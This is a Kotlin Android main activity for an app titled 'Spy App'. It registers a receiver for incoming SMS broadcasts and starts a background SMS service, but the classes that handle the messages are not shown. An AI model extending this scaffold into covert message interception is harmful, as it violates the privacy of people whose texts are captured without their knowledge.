package beigi.v.wellconnectsecond

import android.content.Intent
import android.content.IntentFilter
import android.os.Build
import android.os.Bundle
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.ui.Modifier
import androidx.compose.ui.text.style.TextAlign
import androidx.compose.ui.unit.sp
import beigi.v.wellconnectsecond.broadcast.SMSReceiverBroadCast
import beigi.v.wellconnectsecond.broadcast.SmsService

class MainActivity : ComponentActivity() {
    private lateinit var smsReceiver: SMSReceiverBroadCast

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        enableEdgeToEdge()
        smsReceiver = SMSReceiverBroadCast()

        val intentFilter = IntentFilter("android.provider.Telephony.SMS_RECEIVED")
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            registerReceiver(smsReceiver, intentFilter)
        } else {
            registerReceiver(smsReceiver, intentFilter)
        }
        startService(Intent(this, SmsService::class.java))
        setContent {
            Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                Column(
                    modifier = Modifier
                        .padding(innerPadding)
                        .fillMaxSize()
                ) {
                    Text(
                        "Spy App", fontSize = 25.sp, modifier = Modifier
                            .fillMaxSize(),
                        textAlign = TextAlign.Center
                    )
                }

            }
        }
    }
}